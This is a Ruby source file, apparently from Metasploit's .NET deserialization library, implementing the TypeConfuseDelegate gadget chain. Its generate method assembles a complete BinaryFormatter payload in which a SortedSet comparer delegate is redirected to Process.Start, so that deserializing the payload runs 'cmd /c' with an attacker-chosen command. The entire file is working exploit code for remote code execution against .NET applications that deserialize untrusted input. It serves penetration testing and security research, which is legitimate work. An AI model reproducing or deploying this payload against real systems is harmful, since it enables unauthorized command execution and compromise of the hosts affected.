module Msf
module Util
module DotNetDeserialization
module GadgetChains

  class TypeConfuseDelegate < Types::SerializedStream

    # TypeConfuseDelegate
    #   Credits:
    #     Finders: James Forshaw
    #     Contributors: Alvaro Munoz

    def self.generate(cmd)
      mscorlib = Assemblies::VERSIONS['4.0.0.0'].fetch('mscorlib')
      system = Assemblies::VERSIONS['4.0.0.0'].fetch('System')

      library = Types::RecordValues::BinaryLibrary.new(
        library_id: 2,
        library_name: system.to_s
      )

      obj_id_8 = Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
        class_info: Types::General::ClassInfo.new(
          obj_id: 8,
          name: 'System.DelegateSerializationHolder+DelegateEntry',
          member_names: %w{ type assembly target targetTypeAssembly targetTypeName methodName delegateEntry }
        ),
        member_type_info: Types::General::MemberTypeInfo.new(
          binary_type_enums: %i{ String String Object String String String SystemClass },
          additional_infos: [ 'System.DelegateSerializationHolder+DelegateEntry' ]
        ),
        member_values: [
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 11,
            string: "System.Func`3[[#{mscorlib['System.String']}],[#{mscorlib['System.String']}],[#{system['System.Diagnostics.Process']}]]"
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 12,
            string: mscorlib.to_s
          )),
          Types::Record.from_value(Types::RecordValues::ObjectNull.new),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 13,
            string: system.to_s
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 14,
            string: 'System.Diagnostics.Process'
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 15,
            string: 'Start'
          )),
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 16))
        ]
      )

      obj_id_9 = Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
        class_info: Types::General::ClassInfo.new(
          obj_id: 9,
          name: 'System.Reflection.MemberInfoSerializationHolder',
          member_names: %w{ Name AssemblyName ClassName Signature Signature2 MemberType GenericArguments }
        ),
        member_type_info: Types::General::MemberTypeInfo.new(
          binary_type_enums: %i{ String String String String String Primitive SystemClass },
          additional_infos: [
            Enums::PrimitiveTypeEnum.fetch(:Int32),
            'System.Type[]'
          ]
        ),
        member_values: [
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 15)),
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 13)),
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 14)),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 20,
            string: 'System.Diagnostics.Process Start(System.String, System.String)'
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 21,
            string: 'System.Diagnostics.Process Start(System.String, System.String)'
          )),
          8,
          Types::Record.from_value(Types::RecordValues::ObjectNull.new)
        ]
      )

      self.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        library,
        Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: "System.Collections.Generic.SortedSet`1[[#{mscorlib['System.String']}]]",
            member_names: %w{ Count Comparer Version Items }
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ Primitive SystemClass Primitive StringArray },
            additional_infos: [
              Enums::PrimitiveTypeEnum.fetch(:Int32),
              "System.Collections.Generic.ComparisonComparer`1[[#{mscorlib['System.String']}]]",
              Enums::PrimitiveTypeEnum.fetch(:Int32)
            ]
          ),
          library_id: library.library_id,
          member_values: [
            2,
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 3)),
            2,
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 4))
          ]
        ),
        Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 3,
            name: "System.Collections.Generic.ComparisonComparer`1[[#{mscorlib['System.String']}]]",
            member_names: %w{ _comparison }
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ SystemClass },
            additional_infos: [ 'System.DelegateSerializationHolder' ]
          ),
          member_values: [
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 5))
          ]
        ),
        Types::RecordValues::ArraySingleString.new(
          array_info: {obj_id: 4, member_count: 2},
          members: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 6, string: "/c #{cmd}")),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 7, string: 'cmd'))
          ]
        ),
        Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 5,
            name: 'System.DelegateSerializationHolder',
            member_names: %w{ Delegate method0 method1 }
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: %i{ SystemClass SystemClass SystemClass },
            additional_infos: [
              'System.DelegateSerializationHolder+DelegateEntry',
              'System.Reflection.MemberInfoSerializationHolder',
              'System.Reflection.MemberInfoSerializationHolder'
            ]
          ),
          member_values: [
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 8)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 9)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 10))
          ]
        ),
        obj_id_8,
        obj_id_9,
        Types::RecordValues::ClassWithId.from_member_values(
          obj_id: 10,
          metadata_id: 9,
          class_info: obj_id_9.class_info,
          member_type_info: obj_id_9.member_type_info,
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 22,
              string: 'Compare'
            )),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 24,
              string: 'System.String'
            )),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 25,
              string: 'Int32 Compare(System.String, System.String)'
            )),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 26,
              string: 'System.Int32 Compare(System.String, System.String)'
            )),
            8,
            Types::Record.from_value(Types::RecordValues::ObjectNull.new)
          ]
        ),
        Types::RecordValues::ClassWithId.from_member_values(
          obj_id: 16,
          metadata_id: 8,
          class_info: obj_id_8.class_info,
          member_type_info: obj_id_8.member_type_info,
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 27,
              string: "System.Comparison`1[[#{mscorlib['System.String']}]]"
            )),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
            Types::Record.from_value(Types::RecordValues::ObjectNull.new),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 24)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 22)),
            Types::Record.from_value(Types::RecordValues::ObjectNull.new)
          ]
        ),
        Types::RecordValues::MessageEnd.new,
      ])
    end

  end

end
end
end
end
